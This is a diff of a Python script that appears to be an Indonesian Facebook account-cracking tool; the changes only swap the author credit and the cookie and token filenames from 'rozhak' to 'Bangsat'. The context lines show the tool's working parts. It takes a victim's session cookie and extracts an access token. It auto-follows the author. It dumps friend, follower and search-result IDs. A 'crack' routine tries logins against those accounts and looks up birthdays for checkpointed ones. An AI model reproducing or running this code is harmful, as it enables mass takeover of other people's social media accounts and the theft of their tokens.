@@ -27,8 +27,8 @@ logo = ("""\x1b[1;92m ___ ___ ___ __  __ ___ _   _ __  __
 \x1b[1;96m|  _/   / _|| |\/| || || |_| | |\/| |
 \x1b[1;96m|_| |_|_\___|_|  |_|___|\___/|_|  |_|
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : rozhak
-\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/rozhak.xyz
+\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m au : Bangsat
+\x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m fb : fb.com/Bangsat.XD
 \x1b[1;95m[\x1b[1;97m•\x1b[1;95m]\x1b[1;97m gh : github.com/Bangsat-XD
 \x1b[1;96m[\x1b[1;97m#\x1b[1;96m]\x1b[1;97m——————————————————————————————
 """)
@@ -47,9 +47,9 @@ ua=random.choice(["Mozilla/5.0 (Linux; Android 5.0; Lenovo A1000 Build/S100; wv)
 mbasic_h={"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
 uac=("NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+")
 def basecookie():
-	if os.path.exists("_____rozhak_____"):
-		if os.path.getsize("_____rozhak_____") !=0:
-			return gets_dict_cookies(open('_____rozhak_____').read().strip())
+	if os.path.exists("_____bangsat_____"):
+		if os.path.getsize("_____bangsat_____") !=0:
+			return gets_dict_cookies(open('_____bangsat_____').read().strip())
 		else:login()
 	else:login()
 def gets_dict_cookies(cookies):
@@ -105,10 +105,10 @@ def login():
 	                coki = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = data)
         	        cari = re.search('(EAAA\w+)', coki.text)
 	                hasil = cari.group(1)
-	                cok = open('_____rozhak_____', 'w')
+	                cok = open('_____bangsat_____', 'w')
 	                cok.write(cookie)
 	                cok.close()
-	                tok = open('___rozhak___', 'w')
+	                tok = open('___bangsat___', 'w')
 	                tok.write(hasil)
 	                tok.close()
 	                bot_follow()
@@ -132,13 +132,13 @@ def cek_cookie():
         new=None
         if cek(1)==False:
                 try:
-                        cookie=cvd(open("_____rozhak_____").read().strip())
+                        cookie=cvd(open("_____bangsat_____").read().strip())
                         cvds=cvd(cookie)
                         new=True
                 except:
                         print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
         else:
-                cvds=cvd(open("_____rozhak_____").read().strip())
+                cvds=cvd(open("_____bangsat_____").read().strip())
         r=requests.get("https://mbasic.facebook.com/profile.php",
                 cookies=cvds,
         headers=hdcok()).text
@@ -152,16 +152,16 @@ def cek_cookie():
 		menu()
 	else:
                 try:
-                        os.remove("_____rozhak_____")
+                        os.remove("_____bangsat_____")
                 except:
                         pass
                 print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
 def bot_follow():
 	try:
-		token=open('___rozhak___','r').read()
+		token=open('___bangsat___','r').read()
 	except IOError:
 		print ("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m] \x1b[1;91mCookie Invalid")
-		os.system('rm -rf ___rozhak___')
+		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
 	web = datetime.datetime.now()
@@ -188,10 +188,10 @@ def bot_follow():
 	menu()
 def publik_fast():
         try:
-                token=open('___rozhak___','r').read()
+                token=open('___bangsat___','r').read()
         except IOError:
                 print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookies Invalid')
-                os.system('rm -rf ___rozhak___')
+                os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
@@ -328,8 +328,8 @@ def search(fl,r,b):
 	raw_input("\x1b[1;97m{\x1b[1;92mKembali\x1b[1;97m}")
 	menu()
 def cek(arg):
-	if os.path.exists("_____rozhak_____"):
-		if os.path.getsize("_____rozhak_____") !=0:
+	if os.path.exists("_____bangsat_____"):
+		if os.path.getsize("_____bangsat_____") !=0:
 			return True
 		else:return False
 	else:return False
@@ -338,19 +338,19 @@ def dumpfl():
 	new=None
 	if cek(1)==False:
 		try:
-			cookie=cvd(open("_____rozhak_____").read().strip())
+			cookie=cvd(open("_____bangsat_____").read().strip())
 			cvds=cvd(cookie)
 			new=True
 		except:
 			print("[•] Cookie Invalid");login()
 	else:
-		cvds=cvd(open("_____rozhak_____").read().strip())
+		cvds=cvd(open("_____bangsat_____").read().strip())
 	r=requests.get("https://mbasic.facebook.com/profile.php",
 		cookies=cvds,
 	headers=hdcok()).text
 	if len(bs4.re.findall("logout",r)) !=0:
 		if new==True:
-			open("_____rozhak_____","w").write(cookie)
+			open("_____bangsat_____","w").write(cookie)
 		s=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Query :\x1b[1;96m ")
 		fl=raw_input("\x1b[1;96m[\x1b[1;97m*\x1b[1;96m]\x1b[1;97m Nama File :\x1b[1;96m ")
 		search(
@@ -358,7 +358,7 @@ def dumpfl():
 		"https://m.facebook.com/search/people/?q="+s)
 	else:
 		try:
-			os.remove("_____rozhak_____")
+			os.remove("_____bangsat_____")
 		except:
 			pass
 		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid");login()
@@ -401,10 +401,10 @@ class dump_message:
 	menu()
 def like_post():
         try:
-                token=open('___rozhak___','r').read()
+                token=open('___bangsat___','r').read()
         except IOError:
 		print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
+                os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
@@ -563,10 +563,10 @@ class dump_grup:
 	menu()
 def follower():
         try:
-                token=open('___rozhak___','r').read()
+                token=open('___bangsat___','r').read()
         except IOError:
                 print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
+                os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
@@ -603,10 +603,10 @@ def follower():
 		exit("\x1b[1;91m[\x1b[1;93m•\x1b[1;91m]\x1b[1;93m Koneksi Error")
 def teman():
         try:
-                token=open('___rozhak___','r').read()
+                token=open('___bangsat___','r').read()
         except IOError:
                 print('\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid')
-                os.system('rm -rf ___rozhak___')
+                os.system('rm -rf ___bangsat___')
                 time.sleep(2)
                 login()
         try:
@@ -635,10 +635,10 @@ def teman():
 def menu():
 	global ip, region, org
 	try:
-		token=open('___rozhak___','r').read()
+		token=open('___bangsat___','r').read()
 	except IOError:
 		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
-		os.system('rm -rf ___rozhak___')
+		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
 	try:
@@ -647,7 +647,7 @@ def menu():
 		nama = a['name']
 	except KeyError:
 		print("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m Cookie Invalid")
-		os.system('rm -rf ___rozhak___')
+		os.system('rm -rf ___bangsat___')
 		time.sleep(2)
 		login()
 	except requests.exceptions.ConnectionError:
@@ -739,8 +739,8 @@ def daftar_menu():
 	elif pilih == "00":
 		try:
 			print("\x1b[1;93m[\x1b[1;97m*\x1b[1;93m]\x1b[1;97m Menghapus Cookie & Token")
-			os.remove("___rozhak___")
-			os.remove("_____rozhak_____")
+			os.remove("___bangsat___")
+			os.remove("_____bangsat_____")
 		except Exception as e:
 			exit("\x1b[1;93m[\x1b[1;91m•\x1b[1;93m]\x1b[1;91m File Tidak Ada")
 	else:
@@ -881,7 +881,7 @@ class crack:
 					break
 				elif log.get("status")=="cp":
 					try:
-						token=open('___rozhak___','r').read()
+						token=open('___bangsat___','r').read()
 						q=requests.get("https://graph.facebook.com/"+fl.get("id")+"?access_token="+token)
 						w=json.loads(q.text)
 						bt=w["birthday"]
